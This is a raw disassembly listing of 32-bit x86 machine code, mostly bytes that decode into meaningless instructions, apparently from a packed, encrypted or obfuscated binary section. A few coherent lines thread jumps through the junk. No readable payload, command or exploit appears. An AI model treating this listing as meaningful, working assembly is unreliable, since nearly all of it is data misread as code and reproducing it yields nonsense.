  410c1e:	dec    edi
  410c1f:	add    dh,ch
  410c21:	mov    gs,WORD PTR [edi]
  410c23:	popa   
  410c24:	jns    0x410c17
  410c26:	xor    DWORD PTR [edi+0xa],esp
  410c29:	ja     0x410c31
  410c2b:	push   ebx
  410c2c:	sbb    al,0xd4
  410c2e:	adc    al,0xa5
  410c30:	js     0x410c27
  410c32:	popa   
  410c33:	popa   
  410c34:	pop    ebx
  410c35:	daa    
  410c36:	mov    ds:0xc63a06ad,eax
  410c3b:	pop    edx
  410c3c:	xchg   edx,eax
  410c3d:	cmp    bl,BYTE PTR [ebp+0x32]
  410c40:	(bad)  
  410c41:	cdq    
  410c42:	cli    
  410c43:	sub    eax,0xe72bf7d1
  410c48:	ds cmc 
  410c4a:	add    BYTE PTR [ecx],al
  410c4c:	push   esp
  410c4d:	int3   
  410c4e:	pop    ebx
  410c4f:	repz sbb BYTE PTR [ebx-0x3e],ah
  410c53:	test   bl,bh
  410c55:	push   0x4e
  410c57:	fcmovbe st,st(3)
  410c59:	or     eax,0x768bde0b
  410c5e:	aam    0x77
  410c60:	push   ecx
  410c61:	pop    ecx
  410c62:	mov    ch,0xeb
  410c64:	icebp  
  410c65:	xor    bh,bh
  410c67:	lods   al,BYTE PTR ds:[esi]
  410c68:	xor    al,0xbc
  410c6a:	mov    dl,0x77
  410c6c:	lods   eax,DWORD PTR ds:[esi]
  410c6d:	popa   
  410c6e:	mov    cl,BYTE PTR [ebp+0x15c7d972]
  410c74:	int3   
  410c75:	outs   dx,DWORD PTR ds:[esi]
  410c76:	pop    ecx
  410c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c78:	pop    ds
  410c79:	in     eax,0x7e
  410c7b:	sub    BYTE PTR [esi-0x1040d816],cl
  410c81:	add    dh,bl
  410c83:	adc    DWORD PTR [edi],0xd485d44b
  410c89:	ins    DWORD PTR es:[edi],dx
  410c8a:	lods   al,BYTE PTR ds:[esi]
  410c8b:	and    DWORD PTR [eax+0x57],edi
  410c8e:	aam    0xc9
  410c90:	jp     0x410c67
  410c92:	xor    al,al
  410c94:	(bad)  
  410c95:	mov    dl,0x5
  410c97:	xchg   edi,eax
  410c98:	xchg   BYTE PTR [eax-0x3e],dl
  410c9b:	push   ecx
  410c9c:	cld    
  410c9d:	div    al
  410c9f:	inc    edx
  410ca0:	push   edi
  410ca1:	dec    ecx
  410ca2:	gs pusha 
  410ca4:	sub    ebp,esi
  410ca6:	call   FWORD PTR [edi-0x7f]
  410ca9:	push   ebx
  410caa:	push   ebp
  410cab:	jmp    0x9aeb:0x9fe2f368
  410cb2:	jp     0x410c72
  410cb4:	aad    0x6c
  410cb6:	push   0x23
  410cb8:	popa   
  410cb9:	(bad)  
  410cba:	stos   BYTE PTR es:[edi],al
  410cbb:	loope  0x410c4b
  410cbd:	push   esp
  410cbe:	loop   0x410c96
  410cc0:	push   ecx
  410cc1:	mov    BYTE PTR cs:[ebx],bh
  410cc4:	jb     0x410d26
  410cc6:	and    ebx,edi
  410cc8:	stc    
  410cc9:	sbb    DWORD PTR [edi-0x45],ecx
  410ccc:	sbb    DWORD PTR [esi],ecx
  410cce:	fistp  WORD PTR ss:[eax+0x31]
  410cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd3:	daa    
  410cd4:	dec    ebx
  410cd5:	push   esi
  410cd6:	leave  
  410cd7:	aaa    
  410cd8:	loopne 0x410cac
  410cda:	adc    dl,cl
  410cdc:	in     al,0x2e
  410cde:	cmp    BYTE PTR [ebp-0xd],bl
  410ce1:	sub    ecx,DWORD PTR [esi+0x7]
  410ce4:	das    
  410ce5:	push   es
  410ce6:	fnstcw WORD PTR [ebx+0x17]
  410ce9:	add    al,0xdc
  410ceb:	(bad)  
  410cec:	icebp  
  410ced:	or     ch,BYTE PTR [ebx]
  410cef:	ret    
  410cf0:	sbb    eax,0x52b607e4
  410cf5:	xchg   ebp,eax
  410cf6:	call   0xcd7:0xd110f43d
  410cfd:	sahf   
  410cfe:	push   esp
  410cff:	push   cs
  410d00:	add    ecx,DWORD PTR [ecx+0x14]
  410d03:	in     al,0xe7
  410d05:	pop    esi
  410d06:	dec    ecx
  410d07:	xchg   edi,eax
  410d08:	div    DWORD PTR [ebx+0xdc46abb]
  410d0e:	shl    DWORD PTR [ecx-0x4],0xea
  410d12:	or     ebx,DWORD PTR [edi+0x5e]
  410d15:	mov    al,0xd9
  410d17:	sub    esi,0x9
  410d1a:	stos   DWORD PTR es:[edi],eax
  410d1b:	stos   DWORD PTR es:[edi],eax
  410d1c:	xchg   DWORD PTR [edi-0x4b72181],eax
  410d22:	fidiv  DWORD PTR [ebx]
  410d24:	mov    dh,0x5a
  410d26:	add    edi,ecx
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	repz xchg ecx,eax
  410d62:	aad    0x89
  410d64:	clc    
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	int3   
  410d6d:	jne    0x410d93
  410d6f:	dec    DWORD PTR [edx+0x31]
  410d72:	push   eax
  410d73:	(bad)  
  410d74:	lahf   
  410d75:	inc    edi
  410d76:	daa    
  410d77:	xor    esi,edx
  410d79:	ret    
  410d7a:	loopne 0x410de2
  410d7c:	(bad)  
  410d7d:	jmp    0x5a81:0x99ed3dd5
  410d84:	mov    cl,0xe0
  410d86:	lgs    edx,FWORD PTR [ebx]
  410d89:	lods   eax,DWORD PTR ds:[esi]
  410d8a:	mov    WORD PTR [eax+0x168919c6],es
  410d90:	inc    ebp
  410d91:	sbb    edi,0xcd0ab0ea
  410d97:	adc    ch,BYTE PTR [esi-0x79]
  410d9a:	into   
  410d9b:	mov    edi,ecx
  410d9d:	loopne 0x410e14
  410d9f:	out    dx,eax
  410da0:	inc    ecx
  410da1:	arpl   WORD PTR [edx+0x3c14af83],si
  410da7:	lea    esi,ds:0xfe9cf9a6
  410dad:	rol    ebx,1
  410daf:	dec    ebp
  410db0:	pop    esp
  410db1:	retf   
  410db2:	xchg   BYTE PTR [ecx+0x71],dh
  410db5:	xor    BYTE PTR [ebx],cl
  410db7:	push   eax
  410db8:	xor    al,BYTE PTR [eax+0x38]
  410dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dbc:	lock sbb eax,0x948f938d
  410dc2:	xchg   edx,eax
  410dc3:	jo     0x410d4f
  410dc5:	adc    BYTE PTR [edi+0x66],ah
  410dc8:	int3   
  410dc9:	sti    
  410dca:	pop    ss
  410dcb:	je     0x410e31
  410dcd:	pop    edx
  410dce:	dec    ecx
  410dcf:	mov    ch,0x8e
  410dd1:	xchg   esi,eax
  410dd2:	scas   eax,DWORD PTR es:[edi]
  410dd3:	jg     0x410d82
  410dd5:	test   al,0xad
  410dd7:	or     BYTE PTR [edi],bh
  410dd9:	lds    ebp,FWORD PTR [ecx+0x4d2eaaa9]
  410ddf:	and    BYTE PTR [esi-0x3d],al
  410de2:	mov    bl,0x25
  410de4:	mov    DWORD PTR [eax+eax*2],edx
  410de7:	and    ebp,0x3fccc162
  410ded:	daa    
  410dee:	inc    edi
  410def:	aas    
  410df0:	outs   dx,BYTE PTR ds:[esi]
  410df1:	mov    eax,0x47980cff
  410df6:	push   0xd399840a
  410dfb:	mov    bl,0x27
  410dfd:	and    eax,0x941034d8
  410e02:	add    bl,BYTE PTR [ebx+0x9922f53]
  410e08:	scas   eax,DWORD PTR es:[edi]
  410e09:	inc    ecx
  410e0a:	test   eax,0xf7d5a7f1
  410e0f:	xchg   edi,eax
  410e10:	pop    edi
  410e11:	dec    edi
  410e12:	cmp    al,bl
  410e14:	cld    
  410e15:	jp     0x410e7a
  410e17:	in     al,dx
  410e18:	or     dl,BYTE PTR [edi]
  410e1a:	push   cs
  410e1b:	jbe    0x410e3f
  410e1d:	(bad)  
  410e1e:	mov    esp,0x4787a27f
  410e23:	addr16 int3 
  410e25:	scas   eax,DWORD PTR es:[edi]
  410e26:	iret   
  410e27:	pop    ebx
  410e28:	mul    BYTE PTR [esi]
  410e2a:	dec    esi
  410e2b:	jecxz  0x410dfd
  410e2d:	rcl    esp,1
  410e2f:	adc    DWORD PTR gs:[esi],ebx
  410e32:	popa   
  410e33:	xchg   edi,eax
  410e34:	xor    bh,BYTE PTR [eax+0xc74357a]
  410e3a:	adc    ebp,ecx
  410e3c:	inc    ebx
  410e3d:	pop    ss
  410e3e:	lods   al,BYTE PTR ds:[esi]
  410e3f:	mov    bh,0x93
  410e41:	jmp    0x28b9:0xe8fe8dd0
  410e48:	retf   0x2a23
  410e4b:	sub    BYTE PTR [edi+edx*8],dl
  410e4e:	jge    0x410e0c
  410e50:	outs   dx,DWORD PTR ds:[esi]
  410e51:	sti    
  410e52:	outs   dx,DWORD PTR ds:[esi]
  410e53:	pop    es
  410e54:	imul   ebx,eax,0x5c
  410e57:	adc    eax,0x62539d90
  410e5c:	mov    bh,0x67
  410e5e:	rol    DWORD PTR [ebx+0x3d],cl
  410e61:	in     al,dx
  410e62:	fisttp DWORD PTR [esi-0x5552dfab]
  410e68:	and    cl,cl
  410e6a:	int    0x85
  410e6c:	aaa    
  410e6d:	cmp    DWORD PTR [ebx],edx
  410e6f:	in     eax,0x4
  410e71:	push   edi
  410e72:	jo     0x410e60
  410e74:	push   esp
  410e75:	popf   
  410e76:	add    BYTE PTR [eax*1+0x4b10bcb3],0x98
  410e7e:	push   esi
  410e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e80:	or     DWORD PTR [ebx+esi*8+0x6813fc12],edi
  410e87:	mov    ah,0xd3
  410e89:	dec    ecx
  410e8a:	inc    esp
  410e8b:	aam    0x9f
  410e8d:	rcl    ecx,1
  410e8f:	cld    
  410e90:	mov    ebx,0x335d701c
  410e95:	int3   
  410e96:	int3   
  410e97:	or     eax,0xd3b27191
  410e9c:	xor    al,0x91
  410e9e:	in     al,0xa7
  410ea0:	xchg   edx,eax
  410ea1:	sub    eax,0x96ea1ff9
  410ea6:	fadd   QWORD PTR [edi+0x73]
  410ea9:	ret    
  410eaa:	cmp    edx,ebp
  410eac:	or     al,0x91
  410eae:	stos   DWORD PTR es:[edi],eax
  410eaf:	sub    DWORD PTR [edi],esp
  410eb1:	sbb    BYTE PTR [esi-0x50],dh
  410eb4:	mov    edx,0x361aa68f
  410eb9:	pop    ebx
  410eba:	ret    
  410ebb:	gs cmp eax,0xcd198fd3
  410ec1:	sbb    BYTE PTR [ebx-0x36e5cab3],0xe5
  410ec8:	popa   
  410ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eca:	fidivr WORD PTR [edi+0x7421da5c]
  410ed0:	gs jno 0x410eab
  410ed3:	sub    BYTE PTR [edx-0x319b9614],bl
  410ed9:	cmp    esp,DWORD PTR [esi+0x6820a9d9]
  410edf:	fistp  WORD PTR [edi]
  410ee1:	(bad)  
  410ee2:	xchg   ebp,eax
  410ee3:	mov    eax,0x2f876c4b
  410ee8:	add    ebp,ebx
  410eea:	dec    edi
  410eeb:	sub    DWORD PTR [edx+0x45e95329],esp
  410ef1:	aaa    
  410ef2:	push   ds
  410ef3:	fs xchg ebx,eax
  410ef5:	aaa    
  410ef6:	sar    DWORD PTR ds:0xe0141368,0xf6
  410efd:	les    esp,FWORD PTR [eax-0xad852fa]
  410f03:	sub    ch,bl
  410f05:	dec    ebp
  410f06:	pop    edi
  410f07:	mov    DWORD PTR [ebx-0x1],ebx
  410f0a:	push   edi
  410f0b:	and    eax,0x7af91ef4
  410f10:	aam    0x15
  410f12:	in     eax,dx
  410f13:	push   0xffffffbe
  410f15:	(bad)  
  410f16:	retf   0xc85a
  410f19:	adc    BYTE PTR [esp+ebp*2],bh
  410f1c:	sar    ah,0x42
  410f1f:	push   es
  410f20:	xor    dl,BYTE PTR [ebx+0x4ca492f2]
  410f26:	jmp    0x410f8a
  410f28:	xchg   ebx,eax
  410f29:	data16 cmp BYTE PTR [edx],ah
  410f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f2d:	enter  0x48d9,0xd9
  410f31:	inc    ecx
  410f32:	mov    ebx,0x19f3e7ca
  410f37:	mov    bl,0x3d
  410f39:	pop    esi
  410f3a:	inc    eax
  410f3b:	pop    ebp
  410f3c:	mov    ebp,0xc41b7bf4
  410f41:	and    al,0x88
  410f43:	imul   esi,DWORD PTR [ebx],0x25ed048c
  410f49:	mov    al,0x9f
  410f4b:	scas   eax,DWORD PTR es:[edi]
  410f4c:	inc    ecx
  410f4d:	je     0x410f84
  410f4f:	dec    eax
  410f50:	pop    edi
  410f51:	(bad)  
  410f52:	jecxz  0x410f20
  410f54:	daa    
  410f55:	addr16 je 0x410fb1
  410f58:	sub    bl,BYTE PTR [ecx-0x7e]
  410f5b:	adc    ebx,DWORD PTR [esi-0x2b]
  410f5e:	jne    0x410f60
  410f60:	sub    DWORD PTR [ecx],eax
  410f62:	ret    
  410f63:	outs   dx,DWORD PTR ds:[esi]
  410f64:	sbb    bl,BYTE PTR [eax-0x17]
  410f67:	mov    edi,?
  410f69:	push   esp
  410f6a:	xor    eax,0x282464ba
  410f6f:	es sub al,0x1c
  410f72:	lock and eax,0xbce4bf9e
  410f78:	cs cmc 
  410f7a:	mov    ds:0x440cc0ba,al
  410f7f:	mov    ds:0x9b1cfae0,eax
  410f84:	pop    ss
  410f85:	mov    edx,ebp
  410f87:	(bad)  [eax-0x739b1408]
  410f8d:	mov    bh,0xb9
  410f8f:	and    eax,0x66ea8f0d
  410f94:	cwde   
  410f95:	mov    esi,0x3b48095e
  410f9a:	xor    BYTE PTR [ebx-0x32731bcf],ah
  410fa0:	fs mov ecx,0x42f037b9
  410fa6:	test   eax,0x24afbe44
  410fab:	mov    bh,0x9b
  410fad:	sti    
  410fae:	pop    edi
  410faf:	inc    esi
  410fb0:	or     DWORD PTR [ebx+0x66fa0d55],0xc8856358
  410fba:	jne    0x411000
  410fbc:	inc    eax
  410fbd:	rcr    DWORD PTR [eax-0x6a00548a],cl
  410fc3:	or     eax,0x51d14cdc
  410fc8:	mov    al,ds:0xaf3e0a1b
  410fcd:	mov    esp,edx
  410fcf:	or     al,0xa7
  410fd1:	jl     0x410ff6
  410fd3:	jl     0x410f89
  410fd5:	out    0xc9,al
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 mul bh
  410fec:	push   cs
  410fed:	retf   0x5a65
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	push   edi
  410ff7:	mov    ecx,0xabd2bd78
  410ffc:	cmp    bl,BYTE PTR [edx]
  410ffe:	ret    
  410fff:	sbb    DWORD PTR [edx],ecx
  411001:	loopne 0x411034
  411003:	jae    0x411061
  411005:	sub    DWORD PTR [edx+edi*4],0x8
  411009:	in     al,dx
  41100a:	pop    esp
  41100b:	dec    ebx
  41100c:	add    al,0x48
  41100e:	arpl   WORD PTR [ebx-0x4a3b6cc6],di
  411014:	(bad)  [ecx-0x53a0ded4]
  41101a:	arpl   WORD PTR [esi-0x2891590a],bp
  411020:	imul   ebp,DWORD PTR [edx-0x1cb17cfa],0x5b8457fe
  41102a:	loopne 0x410fe5
  41102c:	push   ecx
  41102d:	dec    ebp
  41102e:	aam    0x65
  411030:	icebp  
  411031:	out    0xc,eax
  411033:	dec    esp
  411034:	mov    edi,0x64ebd177
  411039:	dec    esi
  41103a:	xor    bl,BYTE PTR [eax-0x6c704bd0]
  411040:	fdivr  DWORD PTR [ebx+0x5c4392c7]
  411046:	inc    ebx
  411047:	dec    edx
  411048:	in     eax,dx
  411049:	jo     0x41102d
  41104b:	mov    ebx,0x783bdead
  411050:	pop    esi
  411051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411052:	push   eax
  411053:	jl     0x41109d
  411055:	pop    ds
  411056:	mov    ah,0xa0
  411058:	jg     0x41104e
  41105a:	outs   dx,BYTE PTR ds:[esi]
  41105b:	pop    esp
  41105c:	nop    DWORD PTR [eax+0x6b45eec6]
  411063:	retf   
  411064:	inc    edi
  411065:	jbe    0x411088
  411067:	add    BYTE PTR [edx],cl
  411069:	div    DWORD PTR [edx+0x9]
  41106c:	xchg   ebx,eax
  41106d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41106e:	mov    esp,ebp
  411070:	push   esi
  411071:	inc    esi
  411072:	xchg   esi,eax
  411073:	(bad)  
  411074:	push   esi
  411075:	aad    0xa
  411077:	rol    BYTE PTR [esi-0x22],cl
  41107a:	xchg   ecx,eax
  41107b:	jo     0x41106e
  41107d:	jp     0x4110e3
  41107f:	clc    
  411080:	in     eax,dx
  411081:	retf   
  411082:	shl    BYTE PTR [esi+ebx*1-0x6f91a3ef],0xc3
  41108a:	or     DWORD PTR [eax+0x661808f3],esp
  411090:	xchg   DWORD PTR [ecx],ebp
  411092:	repnz inc eax
  411094:	xor    bh,dl
  411096:	add    al,BYTE PTR [ecx+0x17]
  411099:	ins    DWORD PTR es:[edi],dx
  41109a:	pop    ds
  41109b:	pop    ss
  41109c:	(bad)  
  41109d:	mov    ds:0xe9474eda,eax
  4110a2:	mov    dl,cl
  4110a4:	es jnp 0x411060
  4110a7:	into   
  4110a8:	cmp    eax,0xbb12da74
  4110ad:	fs xchg ebp,eax
  4110af:	xchg   esi,eax
  4110b0:	or     eax,0xc65024b
  4110b5:	or     BYTE PTR ds:0xc8c98652,cl
  4110bb:	in     eax,0x7f
  4110bd:	push   ebx
  4110be:	std    
  4110bf:	imul   DWORD PTR [eax-0xc]
  4110c2:	mov    BYTE PTR [eax+0x65],cl
  4110c5:	mov    edi,0xe66ca6ea
  4110ca:	mov    ah,0xe2
  4110cc:	retf   
  4110cd:	mov    ds:0x3124ce87,eax
  4110d2:	mov    edx,0x2317f3bc
  4110d7:	out    0xbd,eax
  4110d9:	cmovb  eax,edi
  4110dc:	in     eax,0x9e
  4110de:	sub    DWORD PTR [esi-0x68],0x509b27dc
  4110e5:	and    al,0xe9
  4110e7:	xchg   ecx,eax
  4110e8:	test   bl,0x50
  4110eb:	aam    0x63
  4110ed:	pop    esi
  4110ee:	mov    edx,0x502831ad
  4110f3:	dec    esi
  4110f4:	push   0xe5fb12c6
  4110f9:	sub    dl,bh
  4110fb:	jg     0x41111e
  4110fd:	jnp    0x411123
  4110ff:	dec    DWORD PTR [eax+0x41]
  411102:	les    esi,FWORD PTR [ebx-0x1ed9ae40]
  411108:	xchg   esp,eax
  411109:	test   eax,0x3dbf41eb
  41110e:	ja     0x411142
  411110:	lds    ebx,FWORD PTR [eax+eiz*1]
  411113:	loope  0x411112
  411115:	nop
  411116:	lock mov edx,0x710511db
  41111c:	inc    esi
  41111d:	xlat   BYTE PTR ds:[ebx]
  41111e:	or     edx,DWORD PTR [edx+esi*2-0x7d]
  411122:	mov    eax,ds:0x5c706f53
  411127:	cld    
  411128:	leave  
  411129:	xchg   ecx,eax
  41112b:	cmp    eax,eax
  41112d:	std    
  41112e:	sbb    BYTE PTR [edi+ebx*2],al
  411131:	xchg   ecx,eax
  411132:	dec    edx
  411133:	sbb    al,BYTE PTR [edi+0x411cc248]
  411139:	fisubr DWORD PTR [eax]
  41113b:	adc    DWORD PTR [eax-0xa],edx
  41113e:	inc    ecx
  41113f:	leave  
  411140:	jae    0x4110ee
  411142:	aaa    
  411143:	scas   al,BYTE PTR es:[edi]
  411144:	neg    edi
  411146:	(bad)  
  411147:	test   eax,0x8007aa01
  41114c:	xchg   ecx,ebx
  41114e:	loopne 0x41113f
  411150:	push   0x52
  411152:	das    
  411153:	or     al,0xb1
  411155:	and    bh,dh
  411157:	and    DWORD PTR [edi-0x4d],ecx
  41115a:	in     eax,dx
  41115b:	xchg   DWORD PTR [ebx+0x27],ecx
  41115e:	mov    WORD PTR [eax-0x20],?
  411161:	in     al,dx
  411162:	sub    BYTE PTR [ebx],cl
  411164:	test   BYTE PTR [ebp-0xa],ch
  411167:	add    DWORD PTR [edx+0x52078ec9],ecx
  41116d:	(bad)  
  41116e:	mov    ecx,0xd52134c8
  411173:	cli    
  411174:	push   esi
  411175:	scas   al,BYTE PTR es:[edi]
  411176:	into   
  411177:	retf   0xc58e
  41117a:	scas   eax,DWORD PTR es:[edi]
  41117b:	inc    ecx
  41117c:	mov    edi,0x670b8023
  411181:	and    ebx,DWORD PTR [edx-0x23]
  411184:	test   al,0x43
  411186:	outs   dx,BYTE PTR ds:[esi]
  411187:	pushf  
  411188:	(bad)  
  411189:	or     al,0x58
  41118b:	sub    BYTE PTR [edx-0x16],ah
  41118e:	jno    0x411168
  411190:	jp     0x4111fd
  411192:	sub    ebp,DWORD PTR [ebp-0x666f560b]
  411198:	xchg   dh,bh
  41119a:	adc    BYTE PTR [eax],dh
  41119c:	dec    BYTE PTR [ebx]
  41119e:	ror    edx,cl
  4111a0:	pop    ss
  4111a1:	push   esp
  4111a2:	repz in al,dx
  4111a4:	clc    
  4111a5:	lock push es
  4111a7:	scas   eax,DWORD PTR es:[edi]
  4111a8:	mov    eax,0xf6af4b97
  4111ad:	jmp    0x90df2ba6
  4111b2:	fcmovne st,st(5)
  4111b4:	retf   
  4111b5:	or     ch,BYTE PTR [esi+0x231a029]
  4111bb:	dec    eax
  4111bc:	inc    eax
  4111bd:	cmc    
  4111be:	sub    DWORD PTR [ecx+eiz*1-0x1b58e9b3],edi
  4111c5:	jns    0x4111a4
  4111c7:	out    0x5f,eax
  4111c9:	push   ds
  4111ca:	add    al,0xcb
  4111cc:	iret   
  4111cd:	stos   BYTE PTR es:[edi],al
  4111ce:	loopne 0x4111e1
  4111d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d1:	leave  
  4111d2:	add    al,0xc4
  4111d4:	mov    bh,0x34
  4111d6:	icebp  
  4111d7:	pop    ds
  4111d8:	out    dx,eax
  4111d9:	push   0xffffffc0
  4111db:	ror    ah,cl
  4111dd:	inc    ebp
  4111de:	push   esi
  4111df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e0:	mov    eax,0xb12e903a
  4111e5:	adc    BYTE PTR [esi],al
  4111e7:	in     eax,dx
  4111e8:	sahf   
  4111e9:	call   0xaec91bbf
  4111ee:	or     BYTE PTR [eax-0x43],0xca
  4111f2:	popa   
  4111f3:	push   0xffffffee
  4111f5:	lods   al,BYTE PTR ds:[esi]
  4111f6:	lods   eax,DWORD PTR ds:[esi]
  4111f7:	or     DWORD PTR [ecx-0x59050549],ebp
  4111fd:	bound  edi,QWORD PTR [edx+0x7a0e9930]
  411203:	repnz out dx,eax
  411205:	jmp    0xc36b:0xcfe714ff
  41120c:	dec    esp
  41120d:	stos   BYTE PTR es:[edi],al
  41120e:	clc    
  41120f:	jne    0x4111cb
  411211:	xchg   esi,eax
  411212:	test   eax,0xe633eee6
  411217:	imul   ebp,DWORD PTR [ebx+esi*2-0x4d],0xffffffcf
  41121c:	mov    ds,WORD PTR [edx-0x373ab723]
  411222:	sbb    esp,edi
  411224:	mov    ds:0xa74dd2e2,eax
  411229:	push   ebp
  41122a:	retf   0x6650
  41122d:	in     al,0x39
  41122f:	mov    ds:0xa6ec94ee,al
  411234:	mov    ?,edx
  411236:	daa    
  411237:	pop    ss
  411238:	xor    DWORD PTR [ebp+0x5e727238],ecx
  41123e:	out    dx,eax
  41123f:	hlt    
  411240:	and    eax,0x8a54b4fb
  411245:	sbb    DWORD PTR [esi],edi
  411247:	mov    al,ds:0x112916dd
  41124c:	xor    bl,al
  41124e:	jns    0x4112c5
  411250:	imul   ecx,DWORD PTR ds:0xf37b66cb,0x13
  411257:	cdq    
  411258:	dec    edi
  411259:	and    BYTE PTR [edx-0x64],0x60
  41125d:	adc    BYTE PTR [edx-0x2efc64d2],al
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x25],al
  411278:	jp     0x41121e
  41127a:	and    edx,edx
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	inc    ebp
  411284:	aaa    
  411285:	(bad)  
  411286:	jbe    0x411277
  411288:	rcr    BYTE PTR [ecx],1
  41128a:	pop    ebp
  41128b:	inc    ch
  41128d:	mov    al,ds:0x96b23920
  411292:	or     DWORD PTR [esi+eax*1],ebx
  411295:	leave  
  411296:	lods   al,BYTE PTR ds:[esi]
  411297:	or     al,0xf5
  411299:	dec    ecx
  41129a:	fsubrp st(1),st
  41129c:	scas   eax,DWORD PTR es:[edi]
  41129d:	icebp  
  41129e:	in     eax,dx
  41129f:	cld    
  4112a0:	out    0x4f,eax
  4112a2:	and    al,0x79
  4112a4:	(bad)  
  4112a5:	xor    al,dh
  4112a7:	out    dx,eax
  4112a8:	xchg   ebp,eax
  4112a9:	jge    0x4112f8
  4112ab:	xchg   BYTE PTR [eax-0x1fd3299c],dh
  4112b1:	push   0xffffffdc
  4112b3:	mov    dl,0xc
  4112b5:	cmp    DWORD PTR [ecx-0x3aa4062a],0x7db6b8f9
  4112bf:	imul   edi,DWORD PTR [ebx+0x33],0x9178221e
  4112c6:	fnstsw WORD PTR [edi-0x5af6eb74]
  4112cc:	gs xchg esp,eax
  4112ce:	fwait
  4112cf:	rcl    BYTE PTR [edx-0x52],0x95
  4112d3:	int3   
  4112d4:	sbb    eax,0xf71a4501
  4112d9:	sti    
  4112da:	cmp    DWORD PTR [edi+0x5b3d33af],edi
  4112e0:	imul   DWORD PTR [eax+edx*2]
  4112e3:	hlt    
  4112e4:	adc    eax,esi
  4112e6:	sbb    edi,DWORD PTR [ebx]
  4112e8:	xchg   BYTE PTR [eax],ch
  4112ea:	(bad)  
  4112eb:	scas   al,BYTE PTR es:[edi]
  4112ec:	push   esp
  4112ed:	pop    ebx
  4112ee:	cs loope 0x41136d
  4112f1:	push   ecx
  4112f2:	pushf  
  4112f3:	test   BYTE PTR [eax],al
  4112f5:	adc    ch,BYTE PTR [eax+0x12]
  4112f8:	mov    ecx,0x716365a7
  4112fd:	jae    0x411313
  4112ff:	pop    ebx
  411300:	aas    
  411301:	inc    ecx
  411302:	js     0x4112ed
  411304:	icebp  
  411305:	gs ret 
  411307:	sub    al,0xfc
  411309:	push   ecx
  41130a:	inc    ecx
  41130b:	inc    esp
  41130c:	cwde   
  41130d:	repz adc al,0x6
  411310:	mov    ds:0x7044d260,eax
  411315:	mov    al,0xef
  411317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411318:	cmc    
  411319:	cli    
  41131a:	pop    es
  41131b:	inc    esp
  41131c:	neg    BYTE PTR [edx+0x6d]
  41131f:	jne    0x41137a
  411321:	mov    esp,0x2256b98
  411326:	inc    ebp
  411327:	ja     0x411358
  411329:	inc    eax
  41132a:	jb     0x41136b
  41132c:	xchg   edx,eax
  41132d:	dec    ecx
  41132e:	inc    esi
  41132f:	add    al,0xcf
  411331:	inc    ebx
  411332:	and    eax,0x916a1ea3
  411337:	cmp    BYTE PTR [edx],cl
  411339:	outs   dx,BYTE PTR ds:[esi]
  41133a:	leave  
  41133b:	pop    esp
  41133c:	xchg   esp,eax
  41133d:	xor    esi,DWORD PTR [edx]
  41133f:	pushf  
  411340:	mov    cl,0x7d
  411342:	call   FWORD PTR [eax-0x5816c4c2]
  411348:	jmp    0x3245:0x52ab61e
  41134f:	addr16 pop ebp
  411351:	jg     0x411355
  411353:	data16 ja 0x4112f8
  411356:	int3   
  411357:	mov    ch,0xf4
  411359:	stos   DWORD PTR es:[edi],eax
  41135a:	or     esi,DWORD PTR [esi-0x79]
  41135d:	mov    eax,ds:0x560c5850
  411362:	adc    BYTE PTR [eax],ah
  411364:	inc    ecx
  411365:	imul   DWORD PTR [eax-0x3d75e482]
  41136b:	imul   edi,DWORD PTR [ecx],0x7
  41136e:	adc    ch,BYTE PTR [edx+0x5a7d4399]
  411374:	enter  0x2bfd,0xc4
  411378:	cmp    DWORD PTR [ecx+0x37d47b97],ebp
  41137e:	push   cs
  41137f:	inc    eax
  411380:	jecxz  0x411384
  411382:	mov    cl,0xa9
  411384:	ret    
  411385:	push   esp
  411386:	push   0x66
  411388:	pop    eax
  411389:	mov    dh,0x12
  41138b:	or     al,0x1f
  41138d:	push   ecx
  41138e:	or     al,0x8c
  411390:	jns    0x411335
  411392:	sbb    eax,0xa9246ba3
  411397:	fcmove st,st(3)
  411399:	adc    al,0x55
  41139b:	add    al,0x9d
  41139d:	xchg   esp,eax
  41139e:	mov    bh,0x5c
  4113a0:	retf   0x6542
  4113a3:	xchg   esi,eax
